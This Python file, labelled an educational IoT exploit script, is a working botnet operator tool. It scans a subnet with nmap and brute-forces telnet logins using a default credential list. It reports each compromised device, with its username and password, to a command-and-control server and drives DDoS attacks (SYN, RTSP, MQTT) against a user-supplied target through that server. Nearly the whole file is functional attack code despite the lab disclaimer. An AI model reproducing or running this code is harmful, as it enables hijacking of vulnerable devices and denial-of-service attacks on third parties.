#!/usr/bin/env python3
"""
IoT Security Research - Exploit Script
Educational Purpose Only - For Controlled Lab Environment
"""

import socket
import telnetlib
import subprocess
import threading
import time
import requests
import json
import logging
import os
import platform
import sys
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from credentials import get_credentials, get_device_specific_credentials

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('exploit.log'),
        logging.StreamHandler()
    ]
)

class IoTExploiter:
    def __init__(self, cnc_server_ip, subnet=None):
        self.cnc_server_ip = cnc_server_ip
        self.cnc_url = f"http://{cnc_server_ip}:5000"
        self.subnet = subnet or "11.10.10.0/24"
          # Load credentials from external file
        try:
            self.credentials = get_credentials()
            self.log(f"Loaded {len(self.credentials)} credential pairs from credentials.py")
        except ImportError:
            self.log("Warning: Could not import credentials.py, using fallback credentials")
            # Minimal fallback credentials if file is not available
            self.credentials = [
                ("ipcamadmin", "admin"),      # Digital IPCam credentials
                ("temphumidadmin", "admin"),  # Digital TempHumidSensor credentials
                ("admin", "admin"),
                ("root", "root"), 
                ("admin", "password"),
                ("admin", "123456"),
                ("root", "admin"),
                ("pi", "raspberry"),
                ("ubuntu", "ubuntu")
            ]
        
        self.compromised_devices = []
        self.scan_results = []
        
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"[Exploiter] {message}")
        print(f"[{timestamp}] {message}")
    
    def scan_network(self):
        """Scan network for vulnerable IoT devices using direct nmap command"""
        try:
            self.log(f"Starting network scan on {self.subnet}")

            # Phase 1: Quick scan for active hosts
            self.log("Phase 1: Quick scan for active hosts...")
            result = subprocess.run([
                "nmap", "-sn", self.subnet
            ], capture_output=True, text=True, timeout=300)
            
            if result.returncode != 0:
                self.log(f"Nmap ping scan failed: {result.stderr}")
                return []
                
            output = result.stdout
            active_hosts = []
            for line in output.splitlines():
                if line.startswith("Nmap scan report for"):
                    # Extract IP from line like "Nmap scan report for 192.168.1.1"
                    parts = line.split()
                    if len(parts) >= 5:
                        ip = parts[-1].strip('()')
                        active_hosts.append(ip)
                        
            if not active_hosts:
                self.log("No active hosts found")
                return []
                
            self.log(f"Found {len(active_hosts)} active hosts")

            # Phase 2: Detailed scan of active hosts
            self.log("Phase 2: Detailed scan of active hosts...")
            target_ports = "23,80,443,1883,8883,8080"  # Common IoT ports
            vulnerable_hosts = []
            
            for host in active_hosts:
                try:
                    self.log(f"Scanning ports on {host}")
                    result = subprocess.run([
                        "nmap", "-p", target_ports, "-sV", "--open", host
                    ], capture_output=True, text=True, timeout=120)
                    
                    if result.returncode != 0:
                        self.log(f"Port scan failed for {host}: {result.stderr}")
                        continue
                        
                    output = result.stdout
                    current_ip = host
                    
                    for line in output.splitlines():
                        # Example: 23/tcp   open  telnet
                        if "/tcp" in line and "open" in line:
                            parts = line.split()
                            if len(parts) >= 3:
                                port_info = parts[0].split("/")[0]
                                try:
                                    port = int(port_info)
                                    service = parts[2] if len(parts) > 2 else "unknown"
                                    self.log(f"Found open port {port} ({service}) on {current_ip}")
                                    vulnerable_hosts.append({
                                        'ip': current_ip,
                                        'port': port,
                                        'service': service
                                    })
                                except ValueError:
                                    continue
                                    
                except subprocess.TimeoutExpired:
                    self.log(f"Timeout scanning {host}")
                    continue
                except Exception as e:
                    self.log(f"Error scanning {host}: {e}")
                    continue
            
            # Update local scan results
            self.scan_results = vulnerable_hosts
            self.log(f"Scan complete. Found {len(self.scan_results)} potentially vulnerable devices")
            
            # Send each scan result to C&C server
            successful_submits = 0
            for device in self.scan_results:
                try:
                    self.log(f"Sending scan result for {device['ip']}:{device['port']} ({device['service']}) to C&C server")
                    
                    response = requests.post(
                        f"{self.cnc_url}/add-scan-result",
                        json={
                            'ip': device['ip'],
                            'port': device['port'],
                            'service': device['service']
                        },
                        timeout=5
                    )
                    
                    if response.status_code == 200:
                        self.log(f"[SUCCESS] Successfully sent scan result for {device['ip']} to C&C server")
                        successful_submits += 1
                    else:
                        self.log(f"[FAIL] Failed to send scan result for {device['ip']} to C&C server. Status: {response.status_code}")
                        
                except Exception as e:
                    self.log(f"[FAIL] Error sending scan result for {device['ip']}: {e}")

            self.log(f"Successfully submitted {successful_submits}/{len(self.scan_results)} scan results to C&C server")
            return self.scan_results
            
        except subprocess.TimeoutExpired:
            self.log("Network scan timed out")
            return []
        except Exception as e:
            self.log(f"Error during network scan: {e}")
            return []
    
    def attempt_telnet_login(self, host, port, username, password):
        """Attempt telnet login with given credentials"""
        try:
            self.log(f"Attempting telnet connection to {host}:{port} with '{username}':'{password}'")
            tn = telnetlib.Telnet(host, port, timeout=15)
            
            # Wait for login prompt with multiple possible patterns
            login_patterns = [
                b"login: ", b"Login: ", b"Username: ", b"username: ",
                b"user: ", b"User: ", b"Account: ", b"account: "
            ]
            try:
                index, match, response = tn.expect(login_patterns, timeout=15)
                response_text = response.decode(errors='ignore')
                self.log(f"Login prompt response: {response_text.strip()}")
                
                if not match:
                    # Try sending a newline to trigger login prompt
                    tn.write(b"\n")
                    index, match, response = tn.expect(login_patterns, timeout=5)
                    response_text = response.decode(errors='ignore')
                    
                    if not match:
                        self.log(f"[FAIL] No login prompt found for {host}")
                        tn.close()
                        return False
            except Exception as e:
                self.log(f"[FAIL] Exception waiting for login prompt on {host}: {e}")
                tn.close()
                return False
            
            # Send username
            tn.write(username.encode() + b"\n")
            self.log(f"Sent username: '{username}' to {host}")
            
            # Wait for password prompt
            password_patterns = [
                b"Password: ", b"password: ", b"Password:", b"password:",
                b"passcode: ", b"Passcode: ", b"Password for", b"password for"
            ]
            try:
                index, match, response = tn.expect(password_patterns, timeout=15)
                response_text = response.decode(errors='ignore')
                self.log(f"Password prompt response: {response_text.strip()}")
                
                if not match:
                    self.log(f"[FAIL] No password prompt found for {host}")
                    tn.close()
                    return False
            except Exception as e:
                self.log(f"[FAIL] Exception waiting for password prompt on {host}: {e}")
                tn.close()
                return False
            
            # Send password
            password_to_send = password if password else ""
            tn.write(password_to_send.encode() + b"\n")
            self.log(f"Sent password: '{password_to_send}' to {host}")
              # Check for successful login by looking for shell prompts or failure messages
            # More specific shell prompt patterns to avoid false positives
            shell_patterns = [
                b":~$ ", b":~# ", b":/$ ", b":/# ",  # Linux-style prompts with paths
                b"@.*:~$", b"@.*:~#", b"@.*:/$", b"@.*:/#",  # username@hostname:path prompts
                b"$ ", b"# ",  # Basic shell prompts (but only with space after)
                b"admin@", b"root@", b"user@", b"temphumidadmin@",  # Specific user prompts
                b"menu>", b"Main Menu", b"BusyBox"  # Device-specific prompts
            ]
            
            failure_patterns = [
                b"incorrect", b"failed", b"invalid", b"denied", 
                b"Login incorrect", b"Access denied", b"Authentication failed",
                b"wrong", b"error", b"failure", b"not recognized",
                b"login failed", b"access denied", b"authentication failed",
                b"permission denied", b"login attempt failed"
            ]
            
            all_patterns = shell_patterns + failure_patterns
            
            try:
                index, match, response = tn.expect(all_patterns, timeout=20)
                response_text = response.decode(errors='ignore')
                self.log(f"Login response: {response_text.strip()}")
                
                # Check for failure messages first
                if any(failure.decode().lower() in response_text.lower() for failure in failure_patterns):
                    self.log(f"[FAIL] Login rejected for {host} with '{username}':'{password}'")
                    tn.close()
                    return False
                    
                # If no failure message found, check if we matched a shell pattern
                if match and index < len(shell_patterns):
                    # Look for more specific shell prompt indicators
                    if (b"@" in response and (b":~" in response or b":/" in response)) or \
                       (username.encode() in response and b"@" in response):
                        # This looks like a real shell prompt with username@hostname format
                        self.log(f"[SUCCESS] Detected shell prompt with user@host format for {host}")
                        
                        # Verify with a simple echo command
                        tn.write(b"echo SHELL_TEST_SUCCESS\n")
                        try:
                            echo_response = tn.read_until(b"SHELL_TEST_SUCCESS", timeout=5)
                            if b"SHELL_TEST_SUCCESS" in echo_response:
                                self.log(f"[SUCCESS] Shell access confirmed for {host} with '{username}':'{password}'")
                                tn.close()
                                return True
                        except:
                            pass
                        
                        # Even if echo fails, if we have proper shell prompt format, consider it success
                        self.log(f"[SUCCESS] Shell prompt detected for {host} with '{username}':'{password}'")
                        tn.close()
                        return True
                    else:
                        # Generic prompt match - need better verification
                        self.log(f"? Generic prompt detected for {host}, attempting verification...")
                        
                        # Try verification commands
                        verification_commands = [
                            b"whoami\n",
                            b"pwd\n", 
                            b"echo test\n"
                        ]
                        
                        for cmd in verification_commands:
                            tn.write(cmd)
                            try:
                                ver_response = tn.read_until(b"\n", timeout=3)
                                ver_text = ver_response.decode(errors='ignore')
                                
                                # Look for actual command output
                                if any(indicator in ver_text.lower() for indicator in ['root', 'admin', 'user', '/', 'test']):
                                    self.log(f"[SUCCESS] Command verification successful for {host} with '{username}':'{password}'")
                                    tn.close()
                                    return True
                            except:
                                continue
                        
                        # If verification failed, this might be a false positive
                        self.log(f"[FAIL] Could not verify shell access for {host} with '{username}':'{password}'")
                        tn.close()
                        return False
                else:
                    self.log(f"[FAIL] Login failed for {host} with '{username}':'{password}' - no shell prompt")
                    tn.close()
                    return False
                    
            except Exception as e:
                self.log(f"[FAIL] Exception checking login result on {host}: {e}")
                tn.close()
                return False
            
        except Exception as e:
            self.log(f"[FAIL] Telnet connection failed for {host}: {e}")
            return False
    
    def register_compromised_device(self, ip, username, password):
        """Register compromised device with C&C server"""
        try:
            # Validate inputs
            if not ip or not isinstance(ip, str):
                self.log(f"[FAIL] Invalid IP address: {ip}")
                return False
                
            payload = {
                'ip': ip,
                'username': username or "",  # Handle None values
                'password': password or "",  # Handle None values
                'status': 'online',
                'device_type': self._detect_device_type(ip),
                'timestamp': datetime.now().isoformat()
            }
            
            self.log(f"Sending registration request for {ip} with '{username}':'{password}' to C&C server")
            
            try:
                response = requests.post(
                    f"{self.cnc_url}/bot-checkin",
                    json=payload,
                    timeout=15
                )
            except requests.exceptions.ConnectTimeout:
                self.log(f"[FAIL] Connection timeout while registering {ip} with C&C server - retrying once")
                # Retry once
                try:
                    response = requests.post(
                        f"{self.cnc_url}/bot-checkin",
                        json=payload,
                        timeout=30  # Longer timeout for retry
                    )
                except Exception as retry_error:
                    self.log(f"[FAIL] Failed to register {ip} after retry: {retry_error}")
                    # Still add to local list even if C2 registration fails
                    device_info = {
                        'ip': ip,
                        'username': username,
                        'password': password,
                        'status': 'offline',  # Mark as offline since C2 registration failed
                        'registered_c2': False
                    }
                    self.compromised_devices = [d for d in self.compromised_devices if d['ip'] != ip]
                    self.compromised_devices.append(device_info)
                    return False

            if response.status_code == 200:
                self.log(f"[SUCCESS] Successfully registered compromised device {ip} with '{username}':'{password}'")
                # Update local list with exact credentials
                device_info = {
                    'ip': ip,
                    'username': username,
                    'password': password,
                    'status': 'online',
                    'registered_c2': True,
                    'timestamp': datetime.now().isoformat()
                }
                # Remove any existing entry for this IP
                self.compromised_devices = [d for d in self.compromised_devices if d['ip'] != ip]
                # Add the new entry
                self.compromised_devices.append(device_info)
                return True
            else:
                self.log(f"[FAIL] Failed to register device {ip}. Status: {response.status_code}, Response: {response.text}")
                # Still add to local list even if C2 registration fails
                device_info = {
                    'ip': ip,
                    'username': username,
                    'password': password,
                    'status': 'error',
                    'registered_c2': False,
                    'error': f"C2 server returned {response.status_code}"
                }
                self.compromised_devices = [d for d in self.compromised_devices if d['ip'] != ip]
                self.compromised_devices.append(device_info)
                return False

        except Exception as e:
            self.log(f"[FAIL] Error registering compromised device {ip}: {e}")
            # Still add to local list even if registration fails with exception
            device_info = {
                'ip': ip,
                'username': username,
                'password': password,
                'status': 'error',
                'registered_c2': False,
                'error': str(e)
            }
            self.compromised_devices = [d for d in self.compromised_devices if d['ip'] != ip]
            self.compromised_devices.append(device_info)
            return False
    
    def _detect_device_type(self, ip):
        """Try to detect device type based on open ports and banners"""
        try:
            # First check if we already have scan results for this IP
            device_services = [result for result in self.scan_results if result['ip'] == ip]
            
            if device_services:
                service_names = [s['service'].lower() for s in device_services]
                
                if any('cam' in s for s in service_names) or any('rtsp' in s for s in service_names):
                    return 'camera'
                elif any('router' in s for s in service_names) or any('gateway' in s for s in service_names):
                    return 'router'
                elif any('dvr' in s for s in service_names) or any('nvr' in s for s in service_names):
                    return 'dvr'
                    
            # If we couldn't determine from services, try a banner grab
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, 23))
                banner = s.recv(1024)
                s.close()
                
                banner_text = banner.decode(errors='ignore').lower()
                
                if 'dvr' in banner_text or 'nvr' in banner_text:
                    return 'dvr'
                elif 'camera' in banner_text or 'ipcam' in banner_text:
                    return 'camera'
                elif 'router' in banner_text or 'gateway' in banner_text:
                    return 'router'
                elif 'iot' in banner_text:
                    return 'iot'
            except:
                pass
                
            # Default if we can't determine
            return 'unknown'
            
        except Exception:
            return 'unknown'
    
    def save_results(self, prefix="results"):
        """Save scan and exploitation results with custom prefix"""
        try:
            # Create results directory if it doesn't exist
            os.makedirs('results', exist_ok=True)
            
            # Add timestamp to filenames
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Save scan results
            scan_file = f"results/{prefix}_scan_{timestamp}.json"
            with open(scan_file, 'w') as f:
                json.dump(self.scan_results, f, indent=4)
            
            # Save compromised devices
            devices_file = f"results/{prefix}_devices_{timestamp}.json"
            with open(devices_file, 'w') as f:
                json.dump(self.compromised_devices, f, indent=4)
            
            self.log(f"Results saved to {scan_file} and {devices_file}")
            
            # Also save a CSV of compromised devices for easy importing
            csv_file = f"results/{prefix}_devices_{timestamp}.csv"
            with open(csv_file, 'w') as f:
                f.write("IP,Username,Password,Status,RegisteredWithC2\n")
                for device in self.compromised_devices:
                    f.write(f"{device['ip']},{device['username']},{device['password']},{device.get('status', 'unknown')},{device.get('registered_c2', False)}\n")
            
            self.log(f"CSV export saved to {csv_file}")
            
            return True
            
        except Exception as e:
            self.log(f"Error saving results: {e}")
            return False

    def start_ddos_via_c2(self):
        """Initiate Telnet-based DDoS attack via C2 server API"""
        if not self.compromised_devices:
            print("No compromised devices available. Please run brute-force first.")
            return

        print("\nStarting Telnet-based DDoS attack via C2 server...")
        target_ip = input("Enter target IP to attack: ").strip()
        
        if not target_ip:
            print("[FAIL] Target IP cannot be empty.")
            return
            
        attack_type = input("Enter attack type (syn/rtsp/mqtt): ").lower().strip()

        if attack_type not in ['syn', 'rtsp', 'mqtt']:
            print("[FAIL] Invalid attack type. Please choose syn, rtsp, or mqtt.")
            return

        try:
            print(f"Sending attack request to C2 server...")
            print(f"Target: {target_ip}, Attack Type: {attack_type}")
            
            response = requests.post(
                f"{self.cnc_url}/start-telnet-ddos",
                json={
                    "target": target_ip,
                    "attack_type": attack_type
                },
                timeout=60
            )
            
            print(f"Response Status Code: {response.status_code}")
            
            if response.status_code == 200:
                response_data = response.json()
                print(f"C2 server response: {response_data}")
                
                if response_data.get('status') == 'success':
                    successful_ips = response_data.get('successful_ips', [])
                    total_devices = len(self.compromised_devices)
                    
                    if successful_ips:
                        print(f"[SUCCESS] Successfully started DDoS attack on {len(successful_ips)}/{total_devices} devices")
                        print(f"[SUCCESS] Active attack devices: {', '.join(successful_ips)}")
                    else:
                        print(f"[FAIL] Failed to start DDoS attack on any devices")
                        print(f"[FAIL] All {total_devices} devices failed to execute the attack")
                        
                else:
                    error_msg = response_data.get('message', 'Unknown error')
                    print(f"[FAIL] Attack failed: {error_msg}")
                    
            elif response.status_code == 400:
                error_data = response.json()
                print(f"[FAIL] Bad request: {error_data.get('error', 'Unknown error')}")
                
            else:
                print(f"[FAIL] C2 server returned error {response.status_code}")
                try:
                    error_data = response.json()
                    print(f"[FAIL] Error details: {error_data}")
                except:
                    print(f"[FAIL] Error response: {response.text}")

        except requests.exceptions.Timeout:
            print("[FAIL] C2 server request timed out. The attack may still be starting...")
        except requests.exceptions.ConnectionError:
            print("[FAIL] Cannot connect to C2 server. Check if the server is running.")
        except Exception as e:
            print(f"[FAIL] Failed to initiate DDoS via C2: {e}")

    def stop_ddos_via_c2(self):
        """Stop Telnet-based DDoS attack via C2 server API"""
        print("\nStopping Telnet-based DDoS attack via C2 server...")
        
        try:
            response = requests.post(
                f"{self.cnc_url}/stop-telnet-ddos",
                timeout=60
            )
            
            if response.status_code == 200:
                response_data = response.json()
                print(f"[SUCCESS] C2 server response: {response_data}")
                
                stopped_count = response_data.get('stopped_count', 0)
                print(f"[SUCCESS] Successfully attempted to stop DDoS on {stopped_count} devices")
                
                errors = response_data.get('errors', {})
                if errors:
                    print(f"⚠ Errors stopping some devices: {list(errors.keys())}")
            else:
                print(f"[FAIL] C2 server returned error {response.status_code}: {response.text}")

        except requests.exceptions.Timeout:
            print("[FAIL] C2 server request timed out. The stop command may still be processing...")
        except Exception as e:
            print(f"[FAIL] Failed to stop DDoS via C2: {e}")

    def brute_force_telnet(self):
        """Brute force telnet credentials for discovered devices"""
        if not self.scan_results:
            print("[FAIL] No scan results available. Please run a scan first.")
            return
            
        print("\nBrute-forcing Telnet credentials...")
        success_count = 0
        
        # Filter for telnet services
        telnet_targets = [target for target in self.scan_results 
                         if target['service'].lower() == 'telnet' and target['port'] == 23]
        
        if not telnet_targets:
            print("[FAIL] No telnet services found in scan results.")
            return
            
        print(f"Found {len(telnet_targets)} telnet targets to brute force")
        
        for target in telnet_targets:
            target_ip = target['ip']
            self.log(f"Starting brute-force attack on {target_ip}")
            
            success = False
            successful_creds = None
            
            # Try each credential pair
            for i, (username, password) in enumerate(self.credentials):
                self.log(f"Trying credential {i+1}/{len(self.credentials)}: '{username}':'{password}' on {target_ip}")
                
                if self.attempt_telnet_login(target_ip, 23, username, password):
                    self.log(f"[SUCCESS] SUCCESS! {target_ip} compromised with '{username}':'{password}'")
                    successful_creds = (username, password)
                    success = True
                    break
                else:
                    self.log(f"✗ Failed: '{username}':'{password}' on {target_ip}")
            
            # Register the device if credentials were found
            if success and successful_creds:
                username, password = successful_creds
                self.log(f"Registering {target_ip} with credentials '{username}':'{password}' to C&C server")
                
                if self.register_compromised_device(target_ip, username, password):
                    success_count += 1
                    self.log(f"✓ Successfully registered {target_ip} with C&C server")
                else:
                    self.log(f"✗ Failed to register {target_ip} with C&C server")
            else:
                self.log(f"✗ Complete brute-force failure for {target_ip} - tried all {len(self.credentials)} credential pairs")
        
        print(f"\nBrute-force completed!")
        if success_count > 0:
            print(f"✓ Successfully compromised {success_count}/{len(telnet_targets)} devices")
        else:
            print(f"✗ Failed to compromise any devices (0/{len(telnet_targets)})")
            print("✗ Check if credentials are correct or devices are accessible")
        
        self.print_status()

    def fetch_scan_results_from_c2(self):
        """Fetch scan results from the C2 server"""
        try:
            response = requests.get(f"{self.cnc_url}/get-scan-results", timeout=10)
            if response.status_code == 200:
                self.scan_results = response.json()
                self.log(f"Loaded {len(self.scan_results)} scan results from C2 server")
            else:
                self.log(f"Failed to fetch scan results from C2. Status: {response.status_code}")
        except requests.exceptions.Timeout:
            self.log("Timeout fetching scan results from C2")
        except Exception as e:
            self.log(f"Error fetching scan results: {e}")

    def fetch_compromised_devices_from_c2(self):
        """Fetch compromised devices from the C2 server"""
        try:
            response = requests.get(f"{self.cnc_url}/get-compromised-devices", timeout=10)
            if response.status_code == 200:
                self.compromised_devices = response.json()
                self.log(f"Loaded {len(self.compromised_devices)} compromised devices from C2")
            else:
                self.log(f"Failed to fetch compromised devices from C2. Status: {response.status_code}")
        except requests.exceptions.Timeout:
            self.log("Timeout fetching compromised devices from C2")
        except Exception as e:
            self.log(f"Error fetching compromised devices: {e}")

    def print_status(self):
        """Print current status with improved formatting"""
        print("\n" + "="*60)
        print("╔═══════════════════════════════════════════════════╗")
        print("║              IoT Exploiter Status                 ║")
        print("╚═══════════════════════════════════════════════════╝")

        # Print scan results summary
        print("\n[Scan Results]")
        if not self.scan_results:
            print("No scan results available")
        else:
            print(f"Found {len(self.scan_results)} potential targets:")
            
            # Group by service type
            services = {}
            for device in self.scan_results:
                service = device['service'].lower()
                if service not in services:
                    services[service] = []
                services[service].append(device)
            
            # Print summary by service
            for service, devices in services.items():
                print(f"  {service.upper()} ({len(devices)})")
                for device in devices[:5]:  # Only show first 5 of each type
                    print(f"    - {device['ip']}:{device['port']}")
                if len(devices) > 5:
                    print(f"    ... and {len(devices) - 5} more")

        # Print compromised devices with more details
        print("\n[Compromised Devices]")
        if not self.compromised_devices:
            print("No compromised devices available")
        else:
            # Sort devices by IP for consistent display
            sorted_devices = sorted(self.compromised_devices, key=lambda x: x['ip'])
            print(f"Successfully compromised {len(sorted_devices)} devices:")
            
            for i, device in enumerate(sorted_devices, 1):
                # Get status indicator
                if device.get('status') == 'online':
                    status_indicator = "✅ ONLINE"
                elif device.get('status') == 'offline':
                    status_indicator = "❌ OFFLINE"
                else:
                    status_indicator = "❓ UNKNOWN"
                    
                # Get C2 registration status
                if device.get('registered_c2'):
                    c2_status = "✓ Registered with C2"
                else:
                    c2_status = "✗ Not registered with C2"
                
                # Print device info
                print(f"  Device #{i}: {device['ip']} - {status_indicator}")
                print(f"    Credentials: {device['username']}:{device['password']}")
                print(f"    C2 Status: {c2_status}")
                
                # Print additional info if available
                if 'device_type' in device and device['device_type'] != 'unknown':
                    print(f"    Type: {device['device_type']}")
                    
                if 'error' in device:
                    print(f"    Error: {device['error']}")
                    
                print()  # Empty line between devices

        # Print connectivity status
        try:
            response = requests.get(f"{self.cnc_url}/", timeout=2)
            if response.status_code == 200:
                print("\n[C2 Server Status]")
                print(f"✅ Connected to C2 server at {self.cnc_server_ip}")
            else:
                print("\n[C2 Server Status]")
                print(f"⚠️ C2 server at {self.cnc_server_ip} returned status code {response.status_code}")
        except Exception:
            print("\n[C2 Server Status]")
            print(f"❌ Cannot connect to C2 server at {self.cnc_server_ip}")

        print("="*60)

    def interactive_menu(self):
        """Interactive menu for user control with improved UX"""
        while True:
            # Clear screen for better readability
            print("\033[H\033[J") if os.name != 'nt' else os.system('cls')
            
            # Fetch latest data from C2
            try:
                self.fetch_scan_results_from_c2()
                self.fetch_compromised_devices_from_c2()
                c2_connected = True
            except:
                c2_connected = False

            self.print_status()

            print("\n╔═══════════════════════════════════════════════════╗")
            print("║              Available Actions                     ║")
            print("╚═══════════════════════════════════════════════════╝")
            print("1. 🔍 Scan network for vulnerable devices")
            print("2. 🔑 Brute-force Telnet credentials")
            print("3. 🚀 Start Telnet DDoS attack (via C2)")
            print("4. 🛑 Stop Telnet DDoS attack (via C2)")
            print("5. 💾 Save results to disk")
            print("6. 🔄 Refresh status")
            print("7. 📊 View attack history (via C2)")
            print("8. 🔧 Advanced options")
            print("9. 🚪 Exit")

            choice = input("\nEnter your choice (1-9): ").strip()

            if choice == "1":
                subnet = input("\nEnter target subnet (default: current setting): ").strip()
                if subnet:
                    self.subnet = subnet
                
                print(f"\n🔍 Scanning network {self.subnet}...")
                self.scan_network()
                print("\n✅ Scan completed!")

            elif choice == "2":
                if not self.scan_results:
                    print("❌ No scan results available. Please run a scan first.")
                else:
                    custom_creds = input("\nDo you want to use custom credentials? (y/n, default: n): ").strip().lower()
                    if custom_creds == 'y':
                        custom_username = input("Enter username: ").strip()
                        custom_password = input("Enter password: ").strip()
                        if custom_username or custom_password:
                            # Add to beginning of credentials list
                            self.credentials.insert(0, (custom_username, custom_password))
                            print(f"Added '{custom_username}':'{custom_password}' to credentials list")
                    
                    max_attempts = input("Enter maximum login attempts per device (default: all): ").strip()
                    if max_attempts and max_attempts.isdigit():
                        max_attempts = int(max_attempts)
                        print(f"Will try up to {max_attempts} credential pairs per device")
                    else:
                        max_attempts = len(self.credentials)
                        print(f"Will try all {max_attempts} credential pairs per device")
                    
                    self.brute_force_telnet()

            elif choice == "3":
                if not c2_connected:
                    print("❌ Cannot connect to C2 server. Check connection and try again.")
                else:
                    self.start_ddos_via_c2()

            elif choice == "4":
                if not c2_connected:
                    print("❌ Cannot connect to C2 server. Check connection and try again.")
                else:
                    self.stop_ddos_via_c2()

            elif choice == "5":
                filename = input("\nEnter custom filename prefix (default: results): ").strip()
                if not filename:
                    filename = "results"
                
                self.save_results(filename)
                print(f"✅ Results saved with prefix '{filename}'")

            elif choice == "6":
                print("🔄 Refreshing status...")
                continue
                
            elif choice == "7":
                if not c2_connected:
                    print("❌ Cannot connect to C2 server. Check connection and try again.")
                else:
                    try:
                        response = requests.get(f"{self.cnc_url}/get-attack-history", timeout=10)
                        if response.status_code == 200:
                            attacks = response.json()
                            if attacks:
                                print("\n📊 Attack History:")
                                for attack in attacks:
                                    attack_time = attack.get('start_time', 'Unknown')
                                    attack_type = attack.get('attack_type', 'Unknown')
                                    target = attack.get('target', 'Unknown')
                                    status = attack.get('status', 'Unknown')
                                    devices = attack.get('participating_bots', 0)
                                    
                                    print(f"  • {attack_time}: {attack_type} attack on {target}")
                                    print(f"    Status: {status}, Devices: {devices}")
                            else:
                                print("No attack history available")
                        else:
                            print(f"❌ Failed to retrieve attack history. Status: {response.status_code}")
                    except Exception as e:
                        print(f"❌ Error retrieving attack history: {e}")

            elif choice == "8":
                print("\n🔧 Advanced Options:")
                print("1. Change C2 server address")
                print("2. View credentials list")
                print("3. Test device connectivity")
                print("4. Export compromised devices as CSV")
                print("5. Back to main menu")
                
                advanced_choice = input("Enter choice (1-5): ").strip()
                
                if advanced_choice == "1":
                    new_cnc = input(f"Enter new C2 server IP (current: {self.cnc_server_ip}): ").strip()
                    if new_cnc:
                        self.cnc_server_ip = new_cnc
                        self.cnc_url = f"http://{new_cnc}:5000"
                        print(f"✅ C2 server address updated to {new_cnc}")
                
                elif advanced_choice == "2":
                    print("\nCredentials List:")
                    for i, (username, password) in enumerate(self.credentials, 1):
                        print(f"{i}. '{username}':'{password}'")
                
                elif advanced_choice == "3":
                    if not self.compromised_devices:
                        print("❌ No compromised devices to test")
                    else:
                        print("\nTesting device connectivity...")
                        for device in self.compromised_devices:
                            ip = device['ip']
                            try:
                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                s.settimeout(2)
                                s.connect((ip, 23))
                                s.close()
                                print(f"✅ {ip} is reachable on port 23")
                                # Update status
                                device['status'] = 'online'
                            except:
                                print(f"❌ {ip} is not reachable on port 23")
                                device['status'] = 'offline'
                
                elif advanced_choice == "4":
                    if not self.compromised_devices:
                        print("❌ No compromised devices to export")
                    else:
                        filename = input("Enter CSV filename (default: compromised_devices.csv): ").strip()
                        if not filename:
                            filename = "compromised_devices.csv"
                        
                        try:
                            with open(filename, 'w') as f:
                                f.write("IP,Username,Password,Status,Registered_C2\n")
                                for device in self.compromised_devices:
                                    f.write(f"{device['ip']},{device['username']},{device['password']},{device.get('status', 'unknown')},{device.get('registered_c2', False)}\n")
                            print(f"✅ Exported {len(self.compromised_devices)} devices to {filename}")
                        except Exception as e:
                            print(f"❌ Error exporting to CSV: {e}")
                
                elif advanced_choice == "5":
                    continue
                
                else:
                    print("Invalid choice")

            elif choice == "9":
                confirm = input("Are you sure you want to exit? (y/n): ").strip().lower()
                if confirm == 'y':
                    print("Exiting...")
                    break
                else:
                    continue

            else:
                print("❌ Invalid choice. Please try again.")

            input("\nPress Enter to continue...")
    
def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='IoT Security Research - Exploit Script')
    parser.add_argument('--cnc', required=True, help='C&C server IP address')
    parser.add_argument('--subnet', help='Target subnet (default: 11.10.10.0/24)')
    args = parser.parse_args()

    # Test connectivity to C&C server
    cnc_ip = args.cnc
    print(f"Checking connectivity to C&C server at {cnc_ip}...")
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    
    try:
        result = subprocess.run(['ping', param, '1', cnc_ip], 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE, 
                               text=True, 
                               timeout=10)
        output = result.stdout.lower()
        
        if 'ttl=' in output or 'bytes from' in output:
            print(f"✓ C&C server {cnc_ip} is reachable")
        else:
            print(f"✗ Cannot reach C&C server at {cnc_ip}")
            exit(1)
            
    except Exception as e:
        print(f"✗ Error testing connectivity to C&C server: {e}")
        exit(1)

    exploiter = IoTExploiter(args.cnc, args.subnet)
    exploiter.interactive_menu()

if __name__ == "__main__":
    main()